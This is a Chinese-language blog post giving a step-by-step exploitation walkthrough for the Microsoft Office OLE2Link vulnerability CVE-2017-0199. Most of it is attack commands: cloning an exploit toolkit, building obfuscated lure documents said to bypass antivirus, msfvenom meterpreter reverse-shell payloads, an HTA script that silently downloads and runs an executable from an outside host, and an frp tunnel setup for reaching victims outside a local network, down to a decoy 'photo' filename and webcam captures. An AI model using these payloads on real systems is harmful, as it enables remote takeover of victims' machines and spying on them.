<!DOCTYPE html>
<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.147.8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="前言
啊毕业酒会完写文章好晕！"><title>OFFICE OLE2LINK 漏洞 (CVE-2017-0199) 利用&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.63f706677e61b4ee62b8daf083358d3bbf8ac8ab03c7d171af3180fab3a3ebb83efb79fb98674f13dde6db11de2bf694.css" integrity="sha384-Y/cGZ35htO5iuNrwgzWNO7&#43;KyKsDx9FxrzGA&#43;rOj67g&#43;&#43;3n7mGdPE93m2xHeK/aU"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="OFFICE OLE2LINK 漏洞 (CVE-2017-0199) 利用" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/categories/">Categories</a><a class="nav item" href="/tags/">Tags</a><a class="nav item" href="/about">About</a><a class="nav item" href="/links">Links</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
    <h1 class="article title">OFFICE OLE2LINK 漏洞 (CVE-2017-0199) 利用</h1><p class="article date">Sunday, May 7, 2017</p></section><article class="article markdown-body"><h2 id="前言">前言</h2>
<p>啊毕业酒会完写文章好晕！</p>
<p>FireEye上个月公布了一个OFFICE 0day，打开Word文档就可以通过HTA脚本执行任意代码。</p>
<p>可能刚开始看有点乱，简单看一下攻击原理</p>
<blockquote>
<p>1.攻击者向目标用户发送一个嵌入了OLE2LINK对象的Word文档。
2.当用户打开文档之后，winword.exe会向远程服务器发送一个HTTP请求，并获取一个恶意HTA(HTML Application)文件，通过网络更新对象时没有正确处理的Content-Type导致HTA执行。
3.Winword.exe会通过一个COM对象来查询HTA文件处理器，而这一行为将会使微软HTA应用（mshta.exe）加载并执行恶意HTA文件。</p></blockquote>
<h2 id="复现">复现</h2>
<p>复现的步骤，用VBScript编写HTA，把HTA链接插入word文档，在靶机上打开。
我觉得我没必要重写了，这篇文章写的非常详细。
<a href="http://www.duorenwei.com/news/5257.html"target="_blank" rel="noopener noreferrer">OFFICE OLE2LINK（CVE-2017-0199）漏洞利用详解</a></p>
<h2 id="exploit-toolkit-cve-2017-0199">Exploit toolkit CVE-2017-0199</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/bhdresh/CVE-2017-0199
</span></span></code></pre></div><p>推荐这个工具，不需要搭建服务器，直接用socket模块模拟服务器，非常方便。
默认只能运行exe的payload，首先生成文档，后缀名随意。rtf也行，doc也行。
参数-u 就是我们用的payload地址，据说后缀名用doc是为了bypass av。
加 -x 参数可以对内容进行混淆。混淆的方式请查阅generate_exploit_obfuscate_rtf函数，主要就是把payloads的uri混淆。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.92.1/logo.doc -x <span class="m">1</span>
</span></span></code></pre></div><h3 id="生成payloads">生成Payloads</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.92.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe &gt; /home/gorgias/Tools/malware/rtf32.exe
</span></span></code></pre></div><h3 id="等待反弹shell">等待反弹shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.92.1; run&#34;</span>
</span></span></code></pre></div><h3 id="传输payloads">传输Payloads</h3>
<p>运行这段代码，端口默认8080， -p 手动设定端口，加 -H 可以运行指定脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python2 cve-2017-0199_toolkit.py -H test.hta -M exp -e http://192.168.92.1/shell.exe -l /home/gorgias/Tools/malware/rtf64.exe -p <span class="m">8000</span>
</span></span></code></pre></div><p>客户端打开目标文档后，默认会运行这段脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">a</span><span class="o">=</span>new ActiveXObject<span class="o">(</span><span class="s2">&#34;WScript.Shell&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">a.run<span class="o">(</span><span class="s1">&#39;%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\&#39;</span>http://yourpayloads.com/evil.exe<span class="se">\&#39;</span>, <span class="se">\&#39;</span>c:/windows/temp/shell.exe<span class="se">\&#39;</span><span class="o">)</span><span class="p">;</span> c:/windows/temp/shell.exe<span class="err">&#39;</span>, 0<span class="o">)</span><span class="p">;</span>window.close<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">&lt;/script&gt;
</span></span></code></pre></div><h2 id="msf-module">MSF Module</h2>
<p>可以使用这个exploit模块:office_word_hta来实现攻击。
但是使用场景有限，因为这个模块太自动化了，从生成payload到使用handler都是自动配置，payload的反弹ip是固定的，不能用内网穿透的办法渗透外网主机，需要改造。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf &gt; use exploit/windows/fileformat/office_word_hta
</span></span></code></pre></div><p>查看选项，描述都很准确，选项很少，配置简单。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt; options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/windows/fileformat/office_word_hta<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   FILENAME  msf.doc          yes       The file name.
</span></span><span class="line"><span class="cl">   SRVHOST   0.0.0.0          yes       The <span class="nb">local</span> host to listen on. This must be an address on the <span class="nb">local</span> machine or 0.0.0.0
</span></span><span class="line"><span class="cl">   SRVPORT   <span class="m">8080</span>             yes       The <span class="nb">local</span> port to listen on.
</span></span><span class="line"><span class="cl">   SSL       <span class="nb">false</span>            no        Negotiate SSL <span class="k">for</span> incoming connections
</span></span><span class="line"><span class="cl">   SSLCert                    no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
</span></span><span class="line"><span class="cl">   URIPATH   default.hta      yes       The URI to use <span class="k">for</span> the HTA file
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Microsoft Office Word
</span></span></code></pre></div><p>直接run或者exploit就好，会自动切到后台，hta和doc都给你生成好了。直接把doc放在靶机打开就行。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt; exploit
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.
</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>office_word_hta<span class="o">)</span> &gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 192.168.1.177:4444
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> msf.doc stored at /home/gorgias/.msf4/local/msf.doc
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using URL: http://0.0.0.0:8080/default.hta
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Local IP: http://192.168.1.177:8080/default.hta
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Server started.
</span></span></code></pre></div><h2 id="实战">实战</h2>
<p>这里展示如何穿透内网来实现攻击，首先找一台服务器安装frp，代理本地payload和reverse_shell端口。
安装方法见<a href="https://gorgias.me/2017/05/03/frp%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"target="_blank" rel="noopener noreferrer">FRP 使用笔记</a>
frp参数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>rev<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">privilege_mode</span> <span class="o">=</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nb">type</span> <span class="o">=</span> tcp
</span></span><span class="line"><span class="cl"><span class="nv">local_ip</span> <span class="o">=</span> 0.0.0.0
</span></span><span class="line"><span class="cl"><span class="nv">local_port</span> <span class="o">=</span> <span class="m">4445</span>
</span></span><span class="line"><span class="cl"><span class="nv">remote_port</span> <span class="o">=</span> <span class="m">4445</span>
</span></span></code></pre></div><p>使用msfvenom生成hta的payload，我们这里用powershell的类型，用base64进行混淆</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>45.32.42.185 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4445</span> -e cmd/powershell_base64 -f hta-psh &gt; /home/gorgias/Tools/malware/frp.hta
</span></span></code></pre></div><p>等待反弹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4445; run&#34;</span>
</span></span></code></pre></div><p>生成文档</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 cve-2017-0199_toolkit.py -M gen -w 王师傅的照片.doc -u http://frp.gorgiaxx.me:8000/photo.doc -x <span class="m">1</span>
</span></span></code></pre></div><p>用了自定义hta的话就不一定要使用exe的payload了。直接监听端口</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python2 cve-2017-0199_toolkit.py -M exp -H frp.hta -p <span class="m">8080</span>
</span></span></code></pre></div><p><img loading="lazy"  src="./gen.png"
        alt="gen"/>
然后让电脑装有目标版本office的受害者打开这个doc
就能获取会话
<img loading="lazy"  src="./meterpreter.png"
        alt="meterpreter"/>
<img loading="lazy"  src="./screenshot.jpeg"
        alt="screenshot"/>
<img loading="lazy"  src="./cam_snap.jpeg"
        alt="cam_snap"/></p>
<h2 id="reference">Reference</h2>
<p><a href="http://www.91ri.org/16953.html"target="_blank" rel="noopener noreferrer">CVE-2017-0199漏洞复现过程</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/26522540"target="_blank" rel="noopener noreferrer">对CVE-2017-0199的一次复现过程与内网穿透的利用</a></p>
<p><a href="http://www.4hou.com/technology/4260.html"target="_blank" rel="noopener noreferrer">CVE-2017-0199——首个Microsoft Office RTF漏洞</a></p>
<p><a href="http://www.duorenwei.com/news/5257.html"target="_blank" rel="noopener noreferrer">OFFICE OLE2LINK（CVE-2017-0199）漏洞利用详解</a></p>
<p><a href="http://securityaffairs.co/wordpress/58077/breaking-news/cve-2017-0199-exploitation-poc.html"target="_blank" rel="noopener noreferrer">Windows attacks via CVE-2017-0199 – Practical exploitation! (PoC)</a></p>
</article><section class="article labels"><a class="category" href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/>网络安全</a><a class="tag" href=/tags/rtf/>RTF</a><a class="tag" href=/tags/cve-2017-0199/>CVE-2017-0199</a></section>
</div>
<div class="article bottom"><section class="article navigation"><p><a class="link" href="/posts/d-link-dir-850l-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%8A%A5%E5%91%8A/"><span class="iconfont icon-article"></span>D-Link DIR 850L 路由器漏洞验证报告</a></p><p><a class="link" href="/posts/frp%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"><span class="iconfont icon-article"></span>FRP使用笔记</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2025 Gorgias' Blog. </p>
    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>